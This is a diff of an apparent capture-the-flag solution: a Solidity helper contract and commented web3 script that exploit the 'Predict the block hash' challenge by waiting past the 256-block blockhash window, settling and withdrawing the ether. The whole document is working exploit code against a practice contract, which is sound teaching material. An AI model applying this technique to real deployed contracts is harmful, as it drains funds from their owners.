@@ -9,7 +9,7 @@ var predictHashHelper = await PredictHashHelper.deployed();
 
 var blockNumTarget = await web3.eth.getBlockNumber() + 260;
 var answer = await predictHashHelper.getAnswer(blockNumTarget);
-await predictTheBlockHashChallenge.lockInGuess(answer, {from: accounts[0], value: oneEth});
+await predictHashHelper.lockInGuess(answer, {from: accounts[0], value: oneEth});
 var blockNumCurrent = await web3.eth.getBlockNumber();
 while (blockNumCurrent < blockNumberTarget) {
     await predictHashHelper.wasteBlock();
@@ -17,23 +17,34 @@ while (blockNumCurrent < blockNumberTarget) {
 }
 await predictTheBlockHashChallenge.settle();
 await predictTheBlockHashChallenge.isComplete();
+
+var testArray = new Uint8Array(100);
+var promises = testArray.map(x => predictHashHelper.wasteBlock());
+await Promise.all(promises);
 */
 
 contract PredictHashHelper is OtherContract {
     uint8 waste;
+    uint256 settlementBlockNumber;
+
+    function getSettlementBlockNumber() public view returns (uint256) {
+        return settlementBlockNumber;
+    }
 
     function getAnswer(uint256 blockNum) public view returns (bytes32) {
         return block.blockhash(blockNum);
     }
 
-    function wasteBlock() public {
+    function wasteBlock() public returns (uint256) {
         waste += 1;
+        return block.number;
     }
 
     function() public payable { 
     }
 
     function isComplete() public view returns (bool) {
+        require(otherContract != 0);
         PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);
         return predictTheBlockHashChallenge.isComplete();
     }
@@ -43,13 +54,19 @@ contract PredictHashHelper is OtherContract {
     }
 
     function lockInGuess(bytes32 hash) public payable {
+        require(otherContract != 0);
         PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);
         predictTheBlockHashChallenge.lockInGuess.value(1 ether)(hash);
+        settlementBlockNumber = block.number;
     }    
 
     function settle() public {
+        require(otherContract != 0);
         PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);
         predictTheBlockHashChallenge.settle();
+        require(predictTheBlockHashChallenge.isComplete() == true);
+        withdraw();
+        settlementBlockNumber = 0;
     }
 }
 
